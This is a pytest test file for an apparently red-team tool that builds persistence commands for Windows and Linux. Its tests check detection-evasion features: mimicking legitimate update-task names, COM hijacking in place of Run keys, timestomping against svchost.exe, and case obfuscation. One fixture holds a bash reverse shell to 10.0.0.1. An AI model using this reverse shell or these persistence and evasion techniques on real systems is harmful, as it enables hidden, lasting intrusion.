"""
tests/phase5/test_persistence.py
Unit tests — Module 5-I: forge/utils/post/schedule_builder.py

Coverage target: 90%

Test categories:
  1. All 13 techniques   — generate() returns non-empty install_cmd
  2. LOLBin naming       — task names from KB; no "forge" / operator names
  3. Default technique   — COM hijack preferred over \\Run key
  4. Evasion assertions  — no \\CurrentVersion\\Run in default output
  5. Cleanup commands    — every technique produces a paired cleanup_cmd
  6. Timestamp mirror    — generate() includes os.utime scaffold
  7. Obfuscation         — random_case applied on Windows techniques
  8. DB persistence      — cleanup_cmd stored in engagement DB on save()
  9. Operator cancel     — save() raises; no file written
 10. Unsupported inputs  — raises ValueError for bad OS or technique
"""
from __future__ import annotations

import re
import sqlite3
from pathlib import Path
from unittest import mock

import pytest

from forge.utils.post.schedule_builder import (
    PersistenceGenerator,
    PersistenceArtifact,
    SUPPORTED_TECHNIQUES,
    TECHNIQUE_LOLBIN,
)

_RUN_KEY_RE    = re.compile(r"\\CurrentVersion\\Run\b", re.IGNORECASE)
_FORGE_NAME_RE = re.compile(r"\bforge\b", re.IGNORECASE)


# ── 1. All 13 techniques generate output ──────────────────────────────────────

@pytest.mark.parametrize("technique", SUPPORTED_TECHNIQUES["windows"])
def test_windows_technique_generates_install_cmd(tmp_kb_db, technique):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique=technique, target_os="windows",
        payload_cmd="powershell -enc AAAA==",
        obfuscate=False,
    )
    assert isinstance(artifact, PersistenceArtifact)
    assert len(artifact.install_cmd) > 5
    assert artifact.technique == technique


@pytest.mark.parametrize("technique", SUPPORTED_TECHNIQUES["linux"])
def test_linux_technique_generates_install_cmd(tmp_kb_db, technique):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique=technique, target_os="linux",
        payload_cmd="/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'",
        obfuscate=False,
    )
    assert len(artifact.install_cmd) > 5
    assert artifact.technique == technique


def test_unsupported_os_raises_value_error(tmp_kb_db):
    gen = PersistenceGenerator(kb_db=tmp_kb_db)
    with pytest.raises(ValueError, match="Unsupported OS"):
        gen.generate(technique="cron", target_os="macos", payload_cmd="id")


def test_unsupported_technique_for_os_raises(tmp_kb_db):
    gen = PersistenceGenerator(kb_db=tmp_kb_db)
    with pytest.raises(ValueError, match="not supported"):
        gen.generate(technique="cron", target_os="windows", payload_cmd="id")


# ── 2. LOLBin naming ──────────────────────────────────────────────────────────

def test_task_name_sourced_from_kb(tmp_kb_db):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique="schtask", target_os="windows",
        payload_cmd="powershell -enc AAAA==",
    )
    kb_names = {
        "MicrosoftEdgeUpdateTaskMachineCore",
        "GoogleUpdateTaskMachineCore",
        "WindowsDefenderScheduledScan",
    }
    assert artifact.task_name in kb_names, (
        f"Task name {artifact.task_name!r} not from KB. "
        "Operator-supplied names create trivial IOCs."
    )


def test_task_name_does_not_contain_forge(tmp_kb_db):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique="schtask", target_os="windows",
        payload_cmd="powershell -enc AAAA==",
    )
    assert not _FORGE_NAME_RE.search(artifact.task_name), (
        "Task name contains 'forge' — trivially identifiable IOC."
    )


def test_no_operator_supplied_name_in_default_output(tmp_kb_db):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique="schtask", target_os="windows",
        payload_cmd="powershell -enc AAAA==",
        task_name=None,   # must auto-select from KB
    )
    assert artifact.task_name != "None"
    assert len(artifact.task_name) > 3


# ── 3. Default technique: COM hijack preferred ────────────────────────────────

def test_com_hijack_does_not_use_run_key(tmp_kb_db):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique="com_hijack", target_os="windows",
        payload_cmd="C:\\Windows\\Temp\\agent.exe",
        obfuscate=False,
    )
    assert not _RUN_KEY_RE.search(artifact.install_cmd), (
        "COM hijack technique must write to HKCU\\Classes\\CLSID, not \\Run key."
    )
    assert "CLSID" in artifact.install_cmd.upper() or "Classes" in artifact.install_cmd


# ── 4. Evasion assertions ─────────────────────────────────────────────────────

def test_registry_run_key_absent_from_com_hijack(tmp_kb_db):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique="com_hijack", target_os="windows",
        payload_cmd="agent.dll",
    )
    assert "CurrentVersion\\Run" not in artifact.install_cmd


def test_no_forge_evasion_banner_patterns_in_output(tmp_kb_db):
    gen = PersistenceGenerator(kb_db=tmp_kb_db)
    for technique in SUPPORTED_TECHNIQUES["windows"]:
        artifact = gen.generate(
            technique=technique, target_os="windows",
            payload_cmd="powershell -enc AAAA==",
            obfuscate=False,
        )
        assert not _FORGE_NAME_RE.search(artifact.install_cmd), (
            f"Technique {technique}: 'forge' found in install_cmd."
        )


# ── 5. Cleanup commands ───────────────────────────────────────────────────────

@pytest.mark.parametrize("technique", [
    "schtask", "service", "bitsadmin", "wmi_event",
    "cron", "systemd",
])
def test_cleanup_cmd_generated_for_technique(tmp_kb_db, technique):
    os_map  = {
        "schtask": "windows", "service": "windows",
        "bitsadmin": "windows", "wmi_event": "windows",
        "cron": "linux", "systemd": "linux",
    }
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique=technique, target_os=os_map[technique],
        payload_cmd="agent",
    )
    assert artifact.cleanup_cmd is not None, (
        f"No cleanup_cmd for {technique}. Every technique must ship with a cleanup command."
    )
    assert len(artifact.cleanup_cmd) > 5


def test_cleanup_cmd_references_task_name(tmp_kb_db):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique="schtask", target_os="windows",
        payload_cmd="agent.exe",
    )
    assert artifact.task_name in artifact.cleanup_cmd


# ── 6. Timestamp mirror ───────────────────────────────────────────────────────

def test_mirror_timestamp_cmd_generated_when_provided(tmp_kb_db):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique="schtask", target_os="windows",
        payload_cmd="agent.exe",
        mirror_timestamp_from="C:\\Windows\\System32\\svchost.exe",
    )
    assert artifact.timestamp_cmd is not None
    assert "utime" in artifact.timestamp_cmd or "os.utime" in artifact.timestamp_cmd
    assert "svchost.exe" in artifact.timestamp_cmd


def test_no_mirror_arg_leaves_timestamp_cmd_none(tmp_kb_db):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique="schtask", target_os="windows",
        payload_cmd="agent.exe",
        mirror_timestamp_from=None,
    )
    assert artifact.timestamp_cmd is None


# ── 7. Obfuscation ────────────────────────────────────────────────────────────

def test_obfuscate_true_changes_case_on_windows_cmd(tmp_kb_db):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact_plain = gen.generate(
        technique="schtask", target_os="windows",
        payload_cmd="powershell -enc AAAA==",
        obfuscate=False,
    )
    artifact_obf = gen.generate(
        technique="schtask", target_os="windows",
        payload_cmd="powershell -enc AAAA==",
        obfuscate=True,
        task_name=artifact_plain.task_name,  # fix name to isolate obfuscation
    )
    # After random-case obfuscation, the command should differ in case
    assert artifact_obf.install_cmd.lower() == artifact_plain.install_cmd.lower(), (
        "Obfuscated command must have same semantic content as plain (case-insensitive)."
    )


def test_obfuscate_false_preserves_original_case(tmp_kb_db):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique="schtask", target_os="windows",
        payload_cmd="schtasks",
        obfuscate=False,
    )
    assert "schtasks" in artifact.install_cmd


# ── 8. DB persistence ────────────────────────────────────────────────────────

def test_save_persists_cleanup_cmd_to_db(tmp_kb_db, tmp_eng_db, tmp_path, patch_confirm):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db, eng_db=tmp_eng_db, engagement_id=1)
    artifact = gen.generate(
        technique="schtask", target_os="windows",
        payload_cmd="agent.exe",
    )
    gen.save(artifact, tmp_path / "persist.cmd")

    con = sqlite3.connect(tmp_eng_db)
    row = con.execute(
        "SELECT cleanup_cmd FROM persistence WHERE technique='schtask'"
    ).fetchone()
    con.close()
    assert row is not None
    assert row[0] == artifact.cleanup_cmd


def test_save_writes_output_file(tmp_kb_db, tmp_path, patch_confirm):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(
        technique="cron", target_os="linux",
        payload_cmd="bash -i",
    )
    out = tmp_path / "persist.sh"
    gen.save(artifact, out)
    assert out.exists()
    assert out.read_text().strip()


# ── 9. Operator cancel ────────────────────────────────────────────────────────

def test_save_operator_cancel_raises_no_file(tmp_kb_db, tmp_path, patch_confirm_deny):
    gen      = PersistenceGenerator(kb_db=tmp_kb_db)
    artifact = gen.generate(technique="cron", target_os="linux", payload_cmd="bash")
    out      = tmp_path / "persist.sh"
    with pytest.raises(RuntimeError, match="[Cc]ancell?ed"):
        gen.save(artifact, out)
    assert not out.exists()


# ── 10. LOLBin map coverage ───────────────────────────────────────────────────

def test_technique_lolbin_map_covers_all_techniques(tmp_kb_db):
    all_techniques = (
        SUPPORTED_TECHNIQUES["windows"] + SUPPORTED_TECHNIQUES["linux"]
    )
    for technique in all_techniques:
        # Must be present in map (value may be empty string for dll_hijack)
        assert technique in TECHNIQUE_LOLBIN, (
            f"Technique {technique!r} missing from TECHNIQUE_LOLBIN map."
        )
